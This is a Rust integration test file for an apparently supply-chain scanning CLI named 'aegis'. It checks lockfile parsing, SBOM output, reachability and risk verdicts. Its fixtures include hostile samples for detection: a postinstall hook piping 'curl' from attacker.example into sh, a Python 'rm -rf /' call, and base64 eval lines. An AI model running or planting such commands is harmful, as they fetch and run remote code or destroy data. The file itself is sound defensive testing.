//! Integration tests that drive the real `aegis` binary end-to-end.
//! Network-free: only `parse`, `analyze`, and `run` with source-scan
//! checks (ast/heuristics) — no OSV lookup — so they're deterministic
//! and run offline in CI.

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

const BIN: &str = env!("CARGO_BIN_EXE_aegis");

/// Unique temp dir per test (no rand/time dep).
fn tmp(tag: &str) -> PathBuf {
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let d = std::env::temp_dir().join(format!(
        "aegis-cli-it-{tag}-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::Relaxed)
    ));
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn write(dir: &Path, name: &str, body: &str) {
    std::fs::write(dir.join(name), body).unwrap();
}

struct Out {
    code: i32,
    stdout: String,
}

fn run(args: &[&str]) -> Out {
    let o = Command::new(BIN).args(args).output().unwrap();
    Out {
        code: o.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&o.stdout).into_owned(),
    }
}

#[test]
fn parse_lockfile_json() {
    let d = tmp("parse");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "parse",
        d.join("package-lock.json").to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"name\": \"lodash\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("\"version\": \"4.17.21\""));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn parse_unknown_file_exits_2() {
    let out = run(&["parse", "/nonexistent/nope.lock"]);
    assert_eq!(out.code, 2);
}

#[test]
fn analyze_malicious_js_blocks() {
    let d = tmp("analyze");
    write(
        &d,
        "index.js",
        "const cp = require('child_process');\neval(atob('ZXZpbA=='));\n",
    );
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"block\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("shell-spawn"));
    assert!(out.stdout.contains("dynamic-eval"));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_allowlist_suppresses_flag() {
    let d = tmp("analyze-allow");
    write(
        &d,
        "index.js",
        "const cp = require('child_process');\ncp.execSync('ls');\n",
    );
    write(
        &d,
        "package.json",
        "{\"name\":\"demo\",\"version\":\"1.0.0\"}",
    );
    write(
        &d,
        "allow.toml",
        "[[allow]]\nname = \"demo\"\ncapability = \"shell-spawn\"\nreason = \"demo build step\"\n",
    );
    let allow = d.join("allow.toml");

    // Without allowlist: shell-spawn scores.
    let out = run(&["analyze", d.to_str().unwrap(), "--name", "demo", "--json"]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("shell-spawn"), "{}", out.stdout);
    assert!(!out.stdout.contains("\"score\": 0"), "{}", out.stdout);

    // With allowlist: flag present but suppressed, score drops to 0.
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--name",
        "demo",
        "--allowlist",
        allow.to_str().unwrap(),
        "--json",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(
        out.stdout.contains("\"suppressed\": true"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("demo build step"), "{}", out.stdout);
    assert!(out.stdout.contains("\"score\": 0"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_npm_manifest_metadata_heuristics_fire() {
    // The metadata detectors (install-hook, optional-git-dep, vcs-dep) read the
    // package.json the analyze pipeline now parses — not source files. A clean
    // index.js next to a malicious manifest must still BLOCK.
    let d = tmp("manifest");
    write(&d, "index.js", "module.exports = 1;\n");
    write(
        &d,
        "package.json",
        r#"{
          "name": "evilpkg",
          "version": "1.0.0",
          "scripts": { "postinstall": "curl -sSL http://attacker.example/p | sh" },
          "optionalDependencies": { "x": "github:evil/x#aabbcc1122334455667788990011223344556677" }
        }"#,
    );
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"block\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("install-hook-suspicious"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("git-dep-in-optional"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_unlisted_large_file_flagged() {
    // A large undeclared JS file (not in package.json "files") is a smuggled
    // payload shape — exercises the manifest `files` allowlist parsing.
    let d = tmp("unlisted");
    write(
        &d,
        "package.json",
        r#"{"name":"big","version":"1.0.0","files":["dist"]}"#,
    );
    std::fs::write(d.join("payload.js"), "a".repeat(600_000)).unwrap();
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.contains("unlisted-large-file"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_benign_install_hook_scores_review_not_block() {
    // A legit build hook (node-gyp rebuild) still declares an install hook, so
    // it scores the base `install-hook` (weight 30 → "review") — matching the
    // Go analyzer exactly (verified: verdict=review, score=30). It must NOT
    // escalate to "block": the malicious `install-hook-suspicious` pattern
    // (curl|sh etc.) does not fire for a plain build command.
    let d = tmp("cleannpm");
    write(&d, "index.js", "module.exports = 1;\n");
    write(
        &d,
        "package.json",
        r#"{"name":"clean","version":"1.0.0","scripts":{"postinstall":"node-gyp rebuild"},"dependencies":{"lodash":"^4.17.21"}}"#,
    );
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"review\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("install-hook"), "{}", out.stdout);
    assert!(
        !out.stdout.contains("install-hook-suspicious"),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_clean_code_is_safe() {
    let d = tmp("clean");
    write(&d, "index.js", "export const add = (a, b) => a + b;\n");
    let out = run(&["analyze", d.to_str().unwrap(), "--json"]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"verdict\": \"safe\""),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn run_config_parallel_source_tasks_fail_on_block() {
    let d = tmp("run");
    // two malicious package dirs + one clean, all scanned via source checks only.
    std::fs::create_dir_all(d.join("evil1")).unwrap();
    std::fs::create_dir_all(d.join("evil2")).unwrap();
    std::fs::create_dir_all(d.join("good")).unwrap();
    write(&d.join("evil1"), "a.js", "eval(atob('eA=='))");
    write(&d.join("evil2"), "b.py", "import os\nos.system('rm -rf /')");
    write(&d.join("good"), "c.js", "export const x = 1;");

    let cfg = format!(
        r#"
[[task]]
name = "evil1"
path = "{p}/evil1"
ecosystem = "npm"
checks = ["ast", "heuristics"]

[[task]]
name = "evil2"
path = "{p}/evil2"
ecosystem = "pypi"
checks = ["ast", "heuristics"]

[[task]]
name = "good"
path = "{p}/good"
ecosystem = "npm"
checks = ["ast", "heuristics"]
"#,
        p = d.to_str().unwrap()
    );
    write(&d, "aegis.toml", &cfg);

    let out = run(&["run", d.join("aegis.toml").to_str().unwrap(), "--json"]);
    // Any BLOCK task → overall fail → exit 1.
    assert_eq!(out.code, 1, "{}", out.stdout);
    assert!(out.stdout.contains("\"failed\": true"), "{}", out.stdout);
    // The clean task should not fail.
    assert!(out.stdout.contains("\"name\": \"good\""));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn ci_offline_json_reports_go_shape() {
    // --offline (no enrich, no advisories) → every dep is safe → passed=true,
    // and the report carries the Go-shaped project/summary fields. Network-free.
    let d = tmp("cijson");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "ci",
        d.join("package-lock.json").to_str().unwrap(),
        "--offline",
        "--json",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("\"passed\": true"), "{}", out.stdout);
    assert!(out.stdout.contains("\"summary\""), "{}", out.stdout);
    assert!(out.stdout.contains("\"enriched\": false"), "{}", out.stdout);
    assert!(out.stdout.contains("\"fail_on\": \"block\""), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn ci_offline_sarif_emits_valid_log() {
    // --offline skips the OSV lookup → no findings, but --sarif must still emit
    // a well-formed SARIF 2.1.0 log (exit 0). Network-free.
    let d = tmp("cisarif");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "ci",
        d.join("package-lock.json").to_str().unwrap(),
        "--offline",
        "--sarif",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"version\": \"2.1.0\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("\"name\": \"aegis-cli\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("vulnerable-dependency"),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_emits_cyclonedx_from_lockfile() {
    let d = tmp("sbom");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "sbom",
        d.join("package-lock.json").to_str().unwrap(),
        "--project",
        "myapp",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"bomFormat\": \"CycloneDX\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("\"specVersion\": \"1.5\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("pkg:npm/lodash@4.17.21"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("aegis:root:myapp"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_spdx_format() {
    let d = tmp("spdx");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let out = run(&[
        "sbom",
        d.join("package-lock.json").to_str().unwrap(),
        "--format",
        "spdx",
        "--project",
        "myapp",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"spdxVersion\": \"SPDX-2.3\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("pkg:npm/lodash@4.17.21"),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_unknown_format_exits_2() {
    let d = tmp("badfmt");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{}}"#,
    );
    let out = run(&[
        "sbom",
        d.join("package-lock.json").to_str().unwrap(),
        "--format",
        "bogus",
    ]);
    assert_eq!(out.code, 2);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn sbom_unknown_lockfile_exits_2() {
    let out = run(&["sbom", "/nonexistent/nope.lock"]);
    assert_eq!(out.code, 2);
}

#[test]
fn run_deprecated_check_no_lockfile_is_noop() {
    // The `deprecated` check parses lockfiles then queries deps.dev. With no
    // lockfile in the task path there's nothing to query — the check is a
    // network-free no-op: deprecated=0, task passes. Exercises the plumbing.
    let d = tmp("deprecated");
    std::fs::create_dir_all(d.join("pkg")).unwrap();
    write(&d.join("pkg"), "index.js", "export const x = 1;");
    let cfg = format!(
        r#"
[[task]]
name = "dep"
path = "{p}/pkg"
ecosystem = "npm"
checks = ["deprecated"]
"#,
        p = d.to_str().unwrap()
    );
    write(&d, "aegis.toml", &cfg);
    let out = run(&["run", d.join("aegis.toml").to_str().unwrap(), "--json"]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("\"failed\": false"), "{}", out.stdout);
    assert!(
        out.stdout.contains("\"deprecated_findings\": 0"),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn run_license_check_no_lockfile_is_noop() {
    // The `license` check fetches SPDX licenses then matches against deny_licenses.
    // No lockfile → nothing to fetch → network-free no-op: license=0, task passes.
    let d = tmp("license");
    std::fs::create_dir_all(d.join("pkg")).unwrap();
    write(&d.join("pkg"), "index.js", "export const x = 1;");
    let cfg = format!(
        r#"
[[task]]
name = "lic"
path = "{p}/pkg"
ecosystem = "npm"
checks = ["license"]
deny_licenses = ["GPL-3.0"]
"#,
        p = d.to_str().unwrap()
    );
    write(&d, "aegis.toml", &cfg);
    let out = run(&["run", d.join("aegis.toml").to_str().unwrap(), "--json"]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(
        out.stdout.contains("\"license_findings\": 0"),
        "{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn fix_offline_empty_plan_exits_0() {
    // --offline skips the OSV lookup → empty fix plan, exit 0. Network-free.
    let d = tmp("fix");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.21"}}}"#,
    );
    let lock = d.join("package-lock.json");
    let lock = lock.to_str().unwrap();
    let out = run(&["fix", lock, "--offline"]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("no known-vulnerable"), "{}", out.stdout);
    // --offline --json → empty array
    let out = run(&["fix", lock, "--offline", "--json"]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.trim().starts_with('['), "{}", out.stdout);
    // --offline --script → no commands (empty output), exit 0
    let out = run(&["fix", lock, "--offline", "--script"]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.trim().is_empty(), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn fix_unknown_lockfile_exits_2() {
    let out = run(&["fix", "/nonexistent/nope.lock"]);
    assert_eq!(out.code, 2);
}

#[test]
fn allowlist_lists_builtin_rules() {
    // Network-free: the builtin allowlist is compiled in.
    let out = run(&["allowlist"]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("built-in allowlist rules"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("npm/lodash"), "{}", out.stdout);
    // JSON form is a valid array carrying the capability + reason fields.
    let out = run(&["allowlist", "--json"]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.trim().starts_with('['), "{}", out.stdout);
    assert!(
        out.stdout.contains("\"capability\": \"dynamic-eval\""),
        "{}",
        out.stdout
    );
    assert!(
        out.stdout.contains("\"source\": \"builtin\""),
        "{}",
        out.stdout
    );
}

#[test]
fn image_missing_file_exits_2() {
    // The image scanner's extract/scan logic is unit-tested in aegis-image;
    // here we only verify the CLI wiring + the error exit code. Network-free.
    let out = run(&["image", "/nonexistent/image.tar"]);
    assert_eq!(out.code, 2);
}

#[test]
fn explain_lists_capabilities_and_weights() {
    // Network-free: reads the compiled-in capability set + risk weights.
    let out = run(&["explain"]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.contains("shell-spawn"), "{}", out.stdout);
    assert!(out.stdout.contains("known-malware-ioc"), "{}", out.stdout);
    // single capability
    let out = run(&["explain", "shell-spawn", "--json"]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"capability\": \"shell-spawn\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("\"weight\":"), "{}", out.stdout);
    // unknown slug → exit 2
    let out = run(&["explain", "not-a-capability"]);
    assert_eq!(out.code, 2);
}

#[test]
fn reach_reports_import_reachability() {
    // Network-free: reachability is computed from local JS source imports.
    let d = tmp("reach");
    write(
        &d,
        "app.js",
        "const _ = require('lodash');\n_.template('x');\n",
    );
    // imported → reachable, exit 0, and reports the used symbol (function-level)
    let out = run(&["reach", d.to_str().unwrap(), "lodash"]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("reachable"), "{}", out.stdout);
    assert!(out.stdout.contains("template"), "{}", out.stdout);
    // not imported → unreachable, exit 1
    let out = run(&["reach", d.to_str().unwrap(), "express"]);
    assert_eq!(out.code, 1, "{}", out.stdout);
    assert!(out.stdout.contains("unreachable"), "{}", out.stdout);
    // json form carries the used symbols
    let out = run(&["reach", d.to_str().unwrap(), "lodash", "--json"]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.contains("\"reachable\": true"), "{}", out.stdout);
    assert!(out.stdout.contains("\"template\""), "{}", out.stdout);
    // function-level: the used function is reachable (0), an unused one isn't (1)
    let out = run(&[
        "reach",
        d.to_str().unwrap(),
        "lodash",
        "--function",
        "template",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("used"), "{}", out.stdout);
    let out = run(&[
        "reach",
        d.to_str().unwrap(),
        "lodash",
        "--function",
        "merge",
    ]);
    assert_eq!(out.code, 1, "{}", out.stdout);
    assert!(out.stdout.contains("not used"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn reach_function_reports_calling_functions() {
    // Caller detail: which project function reaches the vulnerable symbol.
    let d = tmp("reach-callers");
    write(
        &d,
        "app.js",
        "import _ from 'lodash';\nfunction render() { return _.template('x'); }\n",
    );
    // text form lists the enclosing function + file.
    let out = run(&[
        "reach",
        d.to_str().unwrap(),
        "lodash",
        "--function",
        "template",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("used"), "{}", out.stdout);
    assert!(out.stdout.contains("render"), "{}", out.stdout);
    assert!(out.stdout.contains("app.js"), "{}", out.stdout);
    // json form carries a callers array with the function.
    let out = run(&[
        "reach",
        d.to_str().unwrap(),
        "lodash",
        "--function",
        "template",
        "--json",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("\"callers\""), "{}", out.stdout);
    assert!(out.stdout.contains("\"render\""), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn reach_function_transitive_walks_callers_across_files() {
    // sink.js uses cp.execSync; entry.js calls sink(). --transitive links them.
    let d = tmp("reach-transitive");
    write(
        &d,
        "sink.js",
        "import cp from 'child_process';\nfunction sink() { cp.execSync('x'); }\n",
    );
    write(&d, "entry.js", "function boot() { sink(); }\n");

    // Without --transitive: only the direct user shows.
    let out = run(&[
        "reach",
        d.to_str().unwrap(),
        "child_process",
        "--function",
        "execSync",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("sink"), "{}", out.stdout);
    assert!(!out.stdout.contains("boot"), "{}", out.stdout);

    // With --transitive: the cross-file caller appears, tagged transitive.
    let out = run(&[
        "reach",
        d.to_str().unwrap(),
        "child_process",
        "--function",
        "execSync",
        "--transitive",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("sink (direct)"), "{}", out.stdout);
    assert!(out.stdout.contains("boot (transitive)"), "{}", out.stdout);

    // json form carries the reaching array with direct flags.
    let out = run(&[
        "reach",
        d.to_str().unwrap(),
        "child_process",
        "--function",
        "execSync",
        "--transitive",
        "--json",
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("\"reaching\""), "{}", out.stdout);
    assert!(out.stdout.contains("\"direct\": false"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn hook_prints_pre_commit_script() {
    let out = run(&["hook"]);
    assert_eq!(out.code, 0);
    assert!(out.stdout.starts_with("#!/bin/sh"), "{}", out.stdout);
    assert!(out.stdout.contains("aegis ci"), "{}", out.stdout);
}

#[test]
fn hook_install_writes_file() {
    let d = tmp("hook");
    // fresh git repo
    std::fs::create_dir_all(d.join(".git")).unwrap();
    let out = Command::new(BIN)
        .args(["hook", "--install"])
        .current_dir(&d)
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0));
    assert!(d.join(".git/hooks/pre-commit").is_file());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn hook_install_no_git_exits_2() {
    let d = tmp("nogit");
    let out = Command::new(BIN)
        .args(["hook", "--install"])
        .current_dir(&d)
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn actions_prints_workflow() {
    let out = run(&["actions"]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("aegis supply-chain scan"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("upload-sarif"), "{}", out.stdout);
}

#[test]
fn snapshot_detects_behavioral_drift() {
    // Capture a clean baseline, then re-snapshot a version that gained a
    // dangerous capability (the maintainer-takeover shape) → drift, exit 1.
    let d = tmp("snap");
    std::fs::create_dir_all(d.join("v1")).unwrap();
    std::fs::create_dir_all(d.join("v2")).unwrap();
    write(&d.join("v1"), "index.js", "export const x = 1;\n");
    let base = d.join("base.json");
    let out = run(&[
        "snapshot",
        d.join("v1").to_str().unwrap(),
        "--out",
        base.to_str().unwrap(),
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(base.is_file());

    // no drift against itself
    let out = run(&[
        "snapshot",
        d.join("v1").to_str().unwrap(),
        "--baseline",
        base.to_str().unwrap(),
    ]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("no behavioral drift"), "{}", out.stdout);

    // v2 adds a shell-spawn capability → drift, exit 1
    write(
        &d.join("v2"),
        "index.js",
        "require('child_process').exec('id');\n",
    );
    let out = run(&[
        "snapshot",
        d.join("v2").to_str().unwrap(),
        "--baseline",
        base.to_str().unwrap(),
    ]);
    assert_eq!(out.code, 1, "{}", out.stdout);
    assert!(out.stdout.contains("shell-spawn"), "{}", out.stdout);
    assert!(out.stdout.contains("NEW capability"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn image_requires_file_or_ref() {
    // Neither a tarball path nor --ref → usage error, exit 2. Network-free.
    let out = run(&["image"]);
    assert_eq!(out.code, 2);
}

#[test]
#[ignore = "live network: pulls alpine:latest from registry-1.docker.io"]
fn image_pull_from_registry_scans_clean_alpine() {
    // End-to-end registry pull: anonymous token → manifest → layer blobs →
    // overlay → scan. alpine is clean, so exit 0 with no findings.
    let out = run(&["image", "--ref", "alpine:latest"]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(out.stdout.contains("no risky files"), "{}", out.stdout);
}

#[test]
fn run_unused_deps_check_flags_declared_but_unimported() {
    // A declared dependency never imported in source = dead attack surface.
    // Network-free: reachability is computed from local imports.
    let d = tmp("unused");
    std::fs::create_dir_all(d.join("proj")).unwrap();
    write(
        &d.join("proj"),
        "app.js",
        "import _ from 'lodash';\nconsole.log(_);\n",
    );
    write(
        &d.join("proj"),
        "package.json",
        r#"{"name":"p","version":"1.0.0","dependencies":{"lodash":"^4","express":"^4"}}"#,
    );
    let cfg = format!(
        "[[task]]\nname=\"p\"\npath=\"{p}/proj\"\necosystem=\"npm\"\nchecks=[\"unused-deps\"]\n",
        p = d.to_str().unwrap()
    );
    write(&d, "aegis.toml", &cfg);
    let out = run(&["run", d.join("aegis.toml").to_str().unwrap(), "--json"]);
    assert_eq!(out.code, 0, "{}", out.stdout);
    // express is declared but never imported → unused; lodash is imported → not.
    assert!(out.stdout.contains("\"express\""), "{}", out.stdout);
    assert!(!out.stdout.contains("\"lodash\""), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn analyze_sarif_emits_flags_as_results() {
    // Per-package risk flags → SARIF 2.1.0 for GitHub Code Scanning. Offline.
    let d = tmp("analyzesarif");
    write(&d, "index.js", "require('child_process').exec('id');\n");
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--name",
        "evilpkg",
        "--sarif",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("\"version\": \"2.1.0\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("shell-spawn"), "{}", out.stdout);
    assert!(out.stdout.contains("npm/evilpkg"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn run_sarif_aggregates_task_flags() {
    // Fleet SARIF: each task's risk flags → one aggregate SARIF log, failing
    // overall (exit 1) when a task blocks. Network-free.
    let d = tmp("runsarif");
    std::fs::create_dir_all(d.join("evil")).unwrap();
    // shell-spawn + dynamic-eval + base64 → BLOCK, so the fleet fails overall.
    write(
        &d.join("evil"),
        "a.js",
        "eval(atob('eA=='));\nrequire('child_process').exec('id');\n",
    );
    let cfg = format!(
        "[[task]]\nname=\"evil\"\npath=\"{p}/evil\"\necosystem=\"npm\"\nchecks=[\"ast\",\"heuristics\"]\n",
        p = d.to_str().unwrap()
    );
    write(&d, "aegis.toml", &cfg);
    let out = run(&["run", d.join("aegis.toml").to_str().unwrap(), "--sarif"]);
    assert_eq!(out.code, 1, "{}", out.stdout);
    assert!(
        out.stdout.contains("\"version\": \"2.1.0\""),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("shell-spawn"), "{}", out.stdout);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn run_missing_config_exits_2() {
    let out = run(&["run", "/nonexistent/aegis.toml"]);
    assert_eq!(out.code, 2);
}
